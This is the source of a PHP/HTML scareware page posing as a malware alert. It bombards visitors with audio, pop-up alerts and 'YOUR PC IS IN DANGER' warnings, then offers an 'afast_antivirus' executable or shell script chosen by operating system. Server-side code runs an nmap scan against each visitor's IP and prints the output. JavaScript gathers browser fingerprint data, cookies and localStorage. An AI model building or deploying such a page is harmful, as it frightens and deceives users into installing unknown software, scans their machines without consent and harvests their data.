<html>
<head>
  <link rel="stylesheet" href="style.css">
  <title>danger!!</title>
  <script>
    var visible = window.menubar.visible;
  </script>
</head>
<body>
 <audio autoplay>
  <source src="song.wav">
  Your browser does not support the audio element.
</audio> 
<h1>ALERT, YOUR PC IS IN DANGER!!!</h1>
<?php
echo "<h3>YOUR IP ".$_SERVER['REMOTE_ADDR']."</h3>";
?>
<p>DETECTED POWERFULL MALWARE!, MUST DOWNLOAD THIS ANTIVIRUS</p>
<?php
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Windows')) {
    echo '<a href="downloads/afast_antivirus.exe" ><img src="images/download_button.png" width="200" alt="afast_antivirus.png"></a>';
} elseif (strpos($_SERVER['HTTP_USER_AGENT'], 'Ubuntu')) {
   echo '<a href="downloads/afast_antivirus.sh" ><img src="images/download_button.png" width="200" alt="afast_antivirus.png"></a>';
} else {
	echo '<img src="images/download_button.png" width="200" alt="afast_antivirus.png"></a>';	
}
?>
<h4>Your other info</h4>
<p>
Date:  <?php print (date("Y-m-d h:i:s",time())); ?> <br>
Client screen resolution: <script type='text/javascript'>document.write(screen.width+'x'+screen.height); </script><br>
referer: <?php print ($_SERVER['HTTP_REFERER']); ?><br>
user agent:  <?php print ($_SERVER['HTTP_USER_AGENT']); ?><br>
user port:  <?php print ($_SERVER["REMOTE_PORT"]); ?><br>
</p>
<h4>Other important info of your vulnerable PC</h4>
<p>
<?php
echo system('nmap '.$_SERVER['REMOTE_ADDR'].' -Pn -F -T 5');
?>
<script>
window.alert("DETECTED POWERFULL MALWARE!, MUST DOWNLOAD THIS ANTIVIRUS");
  document.write("<p>" + "navigator.appName: " + navigator.appName + "<br>" + 
  "navigator.appVersion: " + navigator.appVersion + "<br>" + 
  "navigator.cookieEnabled: " + navigator.cookieEnabled + "</p>");
</script>
<script>
window.alert("DO IT NOW OR YOUR PC WILL BE DAMAGED");
var info={

    timeOpened:new Date(),
    timezone:(new Date()).getTimezoneOffset()/60,

    pageon(){return window.location.pathname},
    referrer(){return document.referrer},
    previousSites(){return history.length},

    browserName(){return navigator.appName},
    browserEngine(){return navigator.product},
    browserVersion1a(){return navigator.appVersion},
    browserVersion1b(){return navigator.userAgent},
    browserLanguage(){return navigator.language},
    browserOnline(){return navigator.onLine},
    browserPlatform(){return navigator.platform},
    javaEnabled(){return navigator.javaEnabled()},
    dataCookiesEnabled(){return navigator.cookieEnabled},
    dataCookies1(){return document.cookie},
    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
    dataStorage(){return localStorage},

    sizeScreenW(){return screen.width},
    sizeScreenH(){return screen.height},
    sizeDocW(){return document.width},
    sizeDocH(){return document.height},
    sizeInW(){return innerWidth},
    sizeInH(){return innerHeight},
    sizeAvailW(){return screen.availWidth},
    sizeAvailH(){return screen.availHeight},
    scrColorDepth(){return screen.colorDepth},
    scrPixelDepth(){return screen.pixelDepth},


    latitude(){return position.coords.latitude},
    longitude(){return position.coords.longitude},
    accuracy(){return position.coords.accuracy},
    altitude(){return position.coords.altitude},
    altitudeAccuracy(){return position.coords.altitudeAccuracy},
    heading(){return position.coords.heading},
    speed(){return position.coords.speed},
    timestamp(){return position.timestamp},


    };
    document.write(info.timezone());
</script>
<img src="images/alert.gif" width="200" alt="alert.gif">
</p>
</body>
</html>
